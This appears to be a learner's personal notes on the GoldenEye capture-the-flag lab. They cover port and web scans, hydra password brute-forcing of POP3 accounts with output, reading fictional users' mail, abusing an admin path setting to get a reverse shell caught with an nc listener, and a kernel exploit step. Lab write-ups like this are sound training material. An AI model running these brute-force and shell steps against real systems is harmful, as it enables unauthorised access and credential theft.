@@ -1,0 +1,429 @@
+Name: GoldenEye
+Date: 11/12/2021
+Difficulty: Medium
+Description: Bond, James Bond. A guided CTF.
+Better Description: Boris is beter at pen swirling than sysadmin or cryptography
+Goals: Hack some email, not done it yet
+Learnt: Hydra commandline <service>//:
+
+nmap -sV -sC -p- -O 10.10.161.32                                                             
+Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-09 21:10 GMT
+Stats: 0:00:21 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 12.77% done; ETC: 21:12 (0:02:17 remaining)
+Nmap scan report for 10.10.161.32
+Host is up (0.039s latency).
+Not shown: 65531 closed tcp ports (reset)
+PORT      STATE SERVICE  VERSION
+25/tcp    open  smtp     Postfix smtpd
+|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=ubuntu
+| Not valid before: 2018-04-24T03:22:34
+|_Not valid after:  2028-04-21T03:22:34
+80/tcp    open  http     Apache httpd 2.4.7 ((Ubuntu))
+|_http-title: GoldenEye Primary Admin Server
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+55006/tcp open  ssl/pop3 Dovecot pop3d
+|_pop3-capabilities: SASL(PLAIN) CAPA RESP-CODES USER PIPELINING TOP AUTH-RESP-CODE UIDL
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
+| Not valid before: 2018-04-24T03:23:52
+|_Not valid after:  2028-04-23T03:23:52
+55007/tcp open  pop3     Dovecot pop3d
+|_pop3-capabilities: USER RESP-CODES SASL(PLAIN) AUTH-RESP-CODE CAPA STLS TOP PIPELINING UIDL
+| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
+| Not valid before: 2018-04-24T03:23:52
+|_Not valid after:  2028-04-23T03:23:52
+|_ssl-date: TLS randomness does not represent time
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.92%E=4%D=12/9%OT=25%CT=1%CU=41809%PV=Y%DS=2%DC=I%G=Y%TM=61B2722
+OS:6%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS=8)OPS
+OS:(O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST1
+OS:1NW7%O6=M506ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN
+OS:(R=Y%DF=Y%T=40%W=6903%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
+OS:=S)
+
+Network Distance: 2 hops
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 368.20 seconds
+
+nikto -h 10.10.161.32 
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.161.32
++ Target Hostname:    10.10.161.32
++ Target Port:        80
++ Start Time:         2021-12-09 21:11:21 (GMT0)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.7 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Server may leak inodes via ETags, header found with file /, inode: fc, size: 56aba821be9ed, mtime: gzip
++ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
++ Retrieved x-powered-by header: PHP/5.5.9-1ubuntu4.24
++ /splashAdmin.php: Cobalt Qube 3 admin is running. This may have multiple security problems as described by www.scan-associates.net. These could not be tested remotely.
++ OSVDB-3233: /icons/README: Apache default file found.
++ 7889 requests: 0 error(s) and 9 item(s) reported on remote host
++ End Time:           2021-12-09 21:20:51 (GMT0) (570 seconds)
+---------------------------------------------------------------------------
+
+
+Checking the website source code: http -> check sourcecode -> terminal.js
+
+find this comment
+//
+//Boris, make sure you update your default password. 
+//My sources say MI6 maybe planning to infiltrate. 
+//Be on the lookout for any suspicious network traffic....
+//
+//I encoded you p@ssword below...
+//
+//&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
+//
+//BTW Natalya says she can break your codes
+//
+
+Thus boris needs to update his password.
+Decimal-Ascii encoding
+
+
+Looked at the nikto scan went to /splashAdmin.php
+A chat room for all the GoldenEye characters:
+
+"
+Cobalt Qube 3 has been decommissioned
+
+We can use this page to put up team photos, discussion, etc. Natalya is not allowed to post here though --Boris
+
+
+Here's me with my new sniper rifle.
+
+
+
+Boris why are you wearing shorts in that photo? You do realize you're stationed above the Arctic circle, correct?
+
+BTW your favorite pen broke, but I replaced it with a new special one.
+
+Natalya "best coder" S.
+
+"License to Kill - Complex Grenade Launchers - No Oddjob" - Unknown"
+
+Greetings ya'll! GoldenEye Admin here.
+
+For programming I highly prefer the Alternative to GCC, which FreeBSD uses. It's more verbose when compiling, throwing warnings and such - this can easily be turned off with a proper flag. I've replaced GCC with this throughout the GolenEye systems.
+
+Boris, no arguing about this, GCC has been removed and that's final!
+
+Also why have you been chatting with Xenia in private Boris? She's a new contractor that you've never met before? Are you sure you've never worked together...?
+
+-Admin
+
+Janus was here
+"
+Note the disclosure of usernames for later. Walkthrough suggests hydra, made the mistake of using smtp://ip... reread hydra man page, found some cheatsheets and the reminder "-s" from Deskel later:
+Telnet is used to connect to smtp services so that is answer to the question. 
+
+hydra -l boris -P /root/Desktop/Tools/wordlists/fasttrack.txt -f 10.10.244.197 -s 55007 pop3
+Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2021-12-11 10:40:00
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
+[DATA] attacking pop3://10.10.244.197:55007/
+[STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active
+[STATUS] 72.00 tries/min, 144 tries in 00:02h, 78 to do in 00:02h, 16 active
+[55007][pop3] host: 10.10.244.197   login: boris   password: xxxxxxxxx
+[STATUS] attack finished for 10.10.244.197 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2021-12-11 10:42:44
+
+# Gain access to the email server
+
++OK Logged in.
+list
++OK 3 messages:
+1 544
+2 373
+3 921
+.
+retr 1
++OK 544 octets
+Return-Path: <root@127.0.0.1.goldeneye>
+X-Original-To: boris
+Delivered-To: boris@ubuntu
+Received: from ok (localhost [127.0.0.1])
+        by ubuntu (Postfix) with SMTP id D9E47454B1
+        for <boris>; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
+Message-Id: <20180425022326.D9E47454B1@ubuntu>
+Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
+From: root@127.0.0.1.goldeneye
+
+Boris, this is admin. You can electronically communicate to co-workers and students here. I'm not going to scan emails for security risks because I trust you and the other admins here.
+.
+retr 2
++OK 373 octets
+Return-Path: <natalya@ubuntu>
+X-Original-To: boris
+Delivered-To: boris@ubuntu
+Received: from ok (localhost [127.0.0.1])
+        by ubuntu (Postfix) with ESMTP id C3F2B454B1
+        for <boris>; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
+Message-Id: <20180425024249.C3F2B454B1@ubuntu>
+Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
+From: natalya@ubuntu
+
+Boris, I can break your codes!
+.
+retr 3
++OK 921 octets
+Return-Path: <alec@janus.boss>
+X-Original-To: boris
+Delivered-To: boris@ubuntu
+Received: from janus (localhost [127.0.0.1])
+        by ubuntu (Postfix) with ESMTP id 4B9F4454B1
+        for <boris>; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
+Message-Id: <20180425025235.4B9F4454B1@ubuntu>
+Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
+From: alec@janus.boss
+
+Boris,
+
+Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!
+
+Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....
+
+PS - Keep security tight or we will be compromised.
+
+.
+
+now for natalya
+
+hydra -l natalya -P /root/Desktop/Tools/wordlists/fasttrack.txt -f 10.10.244.197 -s 55007 pop3
+Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2021-12-11 10:48:59
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
+[DATA] attacking pop3://10.10.244.197:55007/
+[STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active
+[55007][pop3] host: 10.10.244.197   login: natalya   password: xxxxxxxxxxxx
+[STATUS] attack finished for 10.10.244.197 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2021-12-11 10:50:55
+
++OK Logged in.
+list
++OK 2 messages:
+1 631
+2 1048
+.
+retr 1
++OK 631 octets
+Return-Path: <root@ubuntu>
+X-Original-To: natalya
+Delivered-To: natalya@ubuntu
+Received: from ok (localhost [127.0.0.1])
+        by ubuntu (Postfix) with ESMTP id D5EDA454B1
+        for <natalya>; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
+Message-Id: <20180425024542.D5EDA454B1@ubuntu>
+Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
+From: root@ubuntu
+
+Natalya, please you need to stop breaking boris' codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.
+
+Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.
+.
+retr 2
++OK 1048 octets
+Return-Path: <root@ubuntu>
+X-Original-To: natalya
+Delivered-To: natalya@ubuntu
+Received: from root (localhost [127.0.0.1])
+        by ubuntu (Postfix) with SMTP id 17C96454B1
+        for <natalya>; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
+Message-Id: <20180425031956.17C96454B1@ubuntu>
+Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
+From: root@ubuntu
+
+Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)
+
+Ok, user creds are:
+
+username: xenia
+password: RCP90rulez!
+
+Boris verified her as a valid contractor so just create the account ok?
+
+And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
+**Make sure to edit your host file since you usually work remote off-network....
+
+Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.
+
+We have found lots of EMAILS!
+Notable information:
+user: xenia pass: RCP9rulez!
+root has a email account - very insecure // in the background I just started running a hydra on root
+natalya can break boris's codes.
+
+Add the severnaya-station.com -> /etc/hosts
+goto the /gnocertdir -> intro to goldeneye -> login as xenia
+
+You can find:
+Profile info
+Xenia X
+Picture of Xenia X
+Country:        Austria
+City/town:      Many
+Email address:  xen@contrax.mil
+First access:   Tuesday, 24 April 2018, 09:02 PM  (3 years 231 days)
+Last access:    Saturday, 11 December 2021, 03:08 AM  (11 secs)
+
+A message between:
+
+Picture of Xenia X      Picture of Dr Doak
+Xenia X                 Dr Doak
+Tuesday, 24 April 2018
+09:24 PM: Greetings Xenia,
+
+As a new Contractor to our GoldenEye training I welcome you. Once your account has been complete, more courses will appear on your dashboard. If you have any questions message me via email, not here.
+
+My email username is...
+
+doak
+
+Thank you,
+
+Cheers,
+
+Dr. Doak "The Doctor"
+Training Scientist - Sr Level Training Operating Supervisor
+GoldenEye Operations Center Sector
+Level 14 - NO2 - id:998623-1334
+Campus 4, Building 57, Floor -8, Sector 6, cube 1,007
+Phone 555-193-826
+Cell 555-836-0944
+Office 555-846-9811
+Personal 555-826-9923
+Email: doak@
+Please Recycle before you print, Stay Green aka save the company money!
+"There's such a thing as Good Grief. Just ask Charlie Brown" - someguy
+"You miss 100% of the shots you don't shoot at" - Wayne G.
+THIS IS A SECURE MESSAGE DO NOT SEND IT UNLESS.
+
+username disclosure of doak
+
+hydra -l doak -P /root/Desktop/Tools/wordlists/fasttrack.txt -f 10.10.244.197 -s 55007 pop3
+Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2021-12-11 11:13:59
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
+[DATA] attacking pop3://10.10.244.197:55007/
+[STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active
+[STATUS] 72.00 tries/min, 144 tries in 00:02h, 78 to do in 00:02h, 16 active
+[55007][pop3] host: 10.10.244.197   login: doak   password: xxxxxxx
+[STATUS] attack finished for 10.10.244.197 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2021-12-11 11:16:22
+
+login as doak
+
+list
++OK 1 messages:
+1 606
+.
+retr 
+-ERR There's no message 0.
+retr 1
++OK 606 octets
+Return-Path: <doak@ubuntu>
+X-Original-To: doak
+Delivered-To: doak@ubuntu
+Received: from doak (localhost [127.0.0.1])
+        by ubuntu (Postfix) with SMTP id 97DC24549D
+        for <doak>; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
+Message-Id: <20180425034731.97DC24549D@ubuntu>
+Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
+From: doak@ubuntu
+
+James,
+If you're reading this, congrats you've gotten this far. You know how tradecraft works right?
+
+Because I don't. Go to our training site and login to my account....dig until you can exfiltrate further information......
+
+username: dr_doak
+password: 4England!
+
+
+Back to the /gnocertdir
+login as dr_doak
+
+download the s3cret.txt file:
+
+007,
+
+I was able to capture this apps adm1n cr3ds through clear txt. 
+
+Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here. 
+
+Something juicy is located here: /dir007key/for-007.jpg
+
+Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.
+
+goto:
+http://severnaya-station.com/dir007key/for-007.jpg
+
+steganography is very powerful way to hide information, if using the attack box:
+apt install steghide
+pip3 install stegoveritas 
+stegoveritas_install_deps
+
+A base64 encoded message for the image description
+eFdpbnRlcjE5OTV4IQ==
+
+base64 -d imagedes                 #get you:
+xWinter1995x!
+
+Login to the /gnocertdir again as admin
+important page hints:
+/admin/phpinfo.php
+/admin/settings.php?section=systempaths
+
+Change the path to aspell to a reverse shell spawn
+Tried creating a blog and nothing happened. Well it is not spell checking, looked how gnu aspell works. Clue here is simple in the sentence:
+To use spell-checking within the editor.
+Search for "editor" not spell checker in the search bar below.
+The top result will be manage ediTINYMCE HTML editor is being used.
+
+http://severnaya-station.com/gnocertdir/admin/settings.php?section=editorsettingstinymce
+
+The spell engine you choose between PSpell, Google Spell or PSpellShell... 
+That did not work
+Turn the editor oo, goto home Add resource -> Page, called: dontstickexploringpensupyournose
+then read the hint. *sigh* pressed the spell check button..
+
+nc -lvnp 4444
+Listening on [0.0.0.0] (family 0, port 4444)
+Connection from 10.10.232.45 37986 received!
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ python -c 'import pty;pty.spawn("/bin/bash")'
+www-data@ubuntu:/tmp$ uname -a
+uname -a
+Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
+
+Get the exploit. Read the code. The hint about the letter that needs to change  is the g in gcc as the admin mentioned previously
+no gcc compiler to compile the exploit. Then run exploit. Goto /root -> cp .flag.txt flag.txt; cat flag.txt
+                                                                                                            
